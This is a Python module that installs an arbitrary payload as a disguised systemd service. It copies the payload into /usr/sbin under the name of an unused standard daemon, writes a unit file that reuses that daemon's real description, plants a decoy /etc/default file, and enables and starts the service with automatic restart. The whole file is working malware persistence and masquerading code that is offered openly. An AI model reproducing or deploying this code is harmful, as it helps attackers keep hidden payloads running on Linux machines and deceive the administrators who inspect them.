"""
systemdservice.py: A module for creating a systemd service and hiding the payload inside a root-only folder.
"""

import os
import shutil
import random
import logging
import platform


defaultServices = {
    'acpid': 'Advanced Configuration and Power Interface event daemon',
    'anacron': 'Anacron is like cron, but it does not assume that the machine is running continuously. Hence, it can be used on machines that aren’t running 24 hours a day, to control daily, weekly, and monthly jobs that are usually controlled by cron.',
    'apmd': 'Advanced Power Management Subsystem (old system). If the server is capable of ACPI support, disable this service',
    'auditd': 'The Linux Auditing System',
    'atd': 'atd runs jobs queued by at',
    'autofs': 'The automount(8) program is used to manage mount points for autofs, the inlined Linux automounter. You can mount NFS, USB, DVD/CD, and CIFS via /etc/fstab.',
    'avahi-daemon': 'The Avahi mDNS/DNS-SD daemon implementing Apple’s ZeroConf architecture (also known as “Rendezvous” or “Bonjour”).',
    'bluetooth': 'Bluetooth services for service discovery, authentication, Human Interface Devices (hidd), etc',
    'cpuspeed': 'This service monitors the system’s idle percentage and reduces or raises the CPUs’ clock speeds and voltages accordingly to minimize power consumption when idle and maximize performance when needed',
    'crond': 'Service to execute scheduled commands via crond daemon.',
    'cups': 'Common unix printing system service',
    'dc_client': 'Startup script for the Distcache SSL Session Cache Client and server proxy. Disable if you do not need cache proxy.',
    'dnsmasq': 'the DNS caching server. Enable if your ISP or remote DNS caching server is pretty slow.',
    'dkmdkms_autoinstallers': 'dkms is a framework which allows kernel modules to be dynamically built for each kernel on your system in a simplified and organized fashion. Disable if possible',
    'firstboot': 'RHLE specific service. It does a few configuration following successful installation of the operating system.',
    'gpm': 'A cut and paste utility and mouse server service for virtual consoles.',
    'haldaemon': 'This service is used for collecting and maintaing information about hardware from several sources. This is only used for X and desktop apps. Disable it on servers.',
    'hplip': 'A service for non-PostScript HP printer. Disable it on servers.',
    'irda': 'IrDA(TM) (Infrared Data Association) is an industry standard for wireless, infrared communication between devices. IrDA speeds range from 9600 bps to 4 Mbps, and IrDA can be used by many modern devices including laptops, LAN adapters, PDAs, printers, and mobile phones. Disable if possible',
    'iscsi': 'iscsi service logs into iSCSI targets needed at system startup (i.e. iscsi client). iscsid will start and stop iSCSI daemon. Use this if you’ve iscsi based storage. Disable if possible',
    'iptables': 'IPv4 and IPv6 firewall service.',
    'irqbalance': 'The irqbalance service will distribute interrupts across the cpus on a multiprocessor system with the purpose of spreading the load.',
    'isdn': 'Provides the Internet connectivity using an ISDN modem. Disable if not using an ISDN modem.',
    'kdump': 'Kernel crash dump analyzer. This service is useful for kernel hackers and device driver development or testing new kernel feature. Dsable the service on production boxes.',
    'kudzu': 'RHEL specific hardware detection service. This is required on desktop or laptop where end users can add a new hardware but not on servers.',
    'lm_sensors': 'lm_sensors is used for monitoring motherboard sensor values.',
    'lvm2-monitor': 'Starts and stops dmeventd monitoring for lvm2. If you are not using LVM2 (Linux volume manager) based storage disable it.',
    'mcstrans': 'Starts the SELinux Context Translation System daemon. This is site specific SELinux requirements. Disable if possible',
    'mdmonitor': 'software RAID monitoring and management service. If you are not using software RAID disable it. This is not required for hardware RAID setup as they comes with their own programs. Disable if possible',
    'messagebus': 'This service broadcasts notifications of system events and other messages (D-bus). Turn it on for bluetooth, X Windows and desktop systems.',
    'microcode_ctl': 'Script to apply cpu microcode for Intel IA32 processor. If you are not using Intel IA32 processor disable it.',
    'netfs': 'Mount and configure Linux network network filesystems (NFS). If you are not using NFS client/server technology disable it.',
    'network': 'A service to activates/deactivates all network interfaces configured to start at boot time.',
    'pcscd': 'The PC/SC smart card sevice is a resource manager for the PC/SC lite and Musclecard frameworks. It coordinatescommunications with smart card readers, smart cards, and cryptographic tokens that are connected to the system.If Smart Cards are not in use on the system, disable this service:',
    'readahead_early': 'This sevice provide one-time caching of files belonging to a few boot services. It does not provide any boosting. Just disable it.',
    'readahead_later': 'This sevice provide one-time caching of files belonging to a few boot services. It does not provide any boosting. Just disable it.',
    'restorecond': 'This service restores the correct security context for SELinux.',
    'rhnsd': 'This service handles the task of connecting periodically to the RHN servers to check for updates, notifications and perform system monitoring tasks according to the service level that your server is subscribed for. Disable this service and use yum-updatesd service.',
    'sendmail': 'Use to start sendmail server.',
    'smartd': 'Self Monitoring and Reporting Technology (SMART) Daemon for hard disks.',
    'setroubleshoot': 'This service starts the SELinux Troubleshooting daemon. It will send notification tothe desktop user of SELinux access denied messages in a user-friendly fashion.',
    'sshd': 'The openssh server. If you need remote login enable it. You must enable this on all servers so that you can login and configure everything.',
    'syslog': 'Syslog is the facility by which many other Linux daemons use to log messages to various system log files. It is a good idea to always run syslog.',
    'xfs': 'X Windows font server. Disable it on servers.',
    'yum-updatesd': 'Update notification daemon for system packages.'
}



if platform.system() == "Linux":
    import dbus
else:
    dbus = None

class createService:
    def __init__(self, payload):
        self.payload = payload

    def _scanServices(self):
        #Had chat help me with this one
        # Connect to the system bus
        bus = dbus.SystemBus()

        # Get a proxy object for the org.freedesktop.systemd1 interface
        systemd = bus.get_object('org.freedesktop.systemd1', '/org/freedesktop/systemd1')

        # Get the manager interface
        manager = dbus.Interface(systemd, 'org.freedesktop.systemd1.Manager')

        # Get a list of active services
        active_services = manager.ListUnitsByPatterns([], ['active'])
        serviceList = []
        for service in active_services:
            serviceList.append(service[0])

        return serviceList

    def _chooseServices(self):
        validOptions = {}
        invalidOptions = []
        curentServices = self._scanServices()
        #separating out the default services in use
        for service in curentServices:
            for default, description in defaultServices.items():
                if service == default:
                    #It is a default service, break out and go next
                    invalidOptions.append(default)
                    break
        #putting the services not in use into a dictionary
        for default, description in defaultServices.items():
            invalidCheck = 0
            validCounter = 0
            for invalid in invalidOptions:
                if default == invalid:
                    invalidCheck = 1
                    break
                else:
                    validCounter = validCounter + 1
            if invalidCheck == 1:
                break
            elif validCounter == len(invalidOptions):
                validOptions[default] = description
            else:
                logging.info("Whoops, logic issue")
        #now that we have a dictionary of valid services to hide as
        #we will now be choosing one to hide as
        chosenOption = {}
        randChoice = random.randrange(0,len(validOptions))
        chosenOption[list(validOptions)[randChoice]] = list(validOptions.values())[randChoice]

        return chosenOption


    def _hideInRoot(self):
        #we will now hide the software in the /usr/sbin directory
        #It will return the path to the renamed payload
        defaultPath = '/usr/sbin/'
        hiddenOption = self._chooseServices()
        hiddenName = list(hiddenOption)[0]
        defaultPath = defaultPath+hiddenName
        shutil.copy(self.payload, defaultPath)
        return defaultPath, hiddenOption


    def _createService(self, defaultPath, chosenOption):
        descriptions = [chosenOption[key] for key in chosenOption]
        description = descriptions[0]
        names = [key for key in chosenOption]
        servName = names[0]+'.service'
        defaultFakeFile = '/etc/default/'+servName
        sourceFile = '/lib/systemd/system/'+servName
        username = os.environ.get('USER')
        psuedo_service = f"""[Unit]
Description={description}

[Service]
User={username}
ExecStart={defaultPath}
Restart=always
RestartSec=1

[Install]
WantedBy=multi-user.target
        """

        symlinkFile = '/etc/systemd/system/'+servName
        enablesymlinkFile = '/etc/systemd/system/multi-user.target.wants/'+servName
        serviceFile = open(sourceFile, 'w')
        serviceFile.write(psuedo_service)
        serviceFile.close()
        os.symlink(sourceFile, symlinkFile)
        os.symlink(sourceFile, enablesymlinkFile)
        fakeFile = open(defaultFakeFile, 'w')
        fakeFile.write('# '+psuedo_service)
        fakeFile.close()

    def _daemonReload(self):
        bus = dbus.SystemBus()
        manager_obj = bus.get_object("org.freedesktop.systemd1", "/org/freedesktop/systemd1")
        manager = dbus.Interface(manager_obj, "org.freedesktop.systemd1.Manager")

        try:
            manager.Reload()
            logging.info("Systemd daemon reloaded successfully.")
        except dbus.exceptions.DBusException as e:
            logging.info("Failed to reload systemd daemon. Error: {}".format(str(e)))

    def _startService(self, service_name):
        bus = dbus.SystemBus()
        manager_obj = bus.get_object("org.freedesktop.systemd1", "/org/freedesktop/systemd1")
        manager = dbus.Interface(manager_obj, "org.freedesktop.systemd1.Manager")
        try:
            manager.StartUnit("{0}.service".format(service_name), "replace")
            logging.info("Service '{0}' has been started.".format(service_name))
        except dbus.exceptions.DBusException as e:
            logging.info("Failed to start service '{0}'. Error: {1}".format(service_name, str(e)))


    def install(self):
        hidePath, hideName = self._hideInRoot()
        servName = [key for key in hideName][0]

        logging.info(f"Selected service: {servName}")
        logging.info(f"Service description: {hideName[servName]}")
        logging.info(f"Service path: {hidePath}")

        self._createService(hidePath, hideName)
        self._daemonReload()
        self._startService(servName)
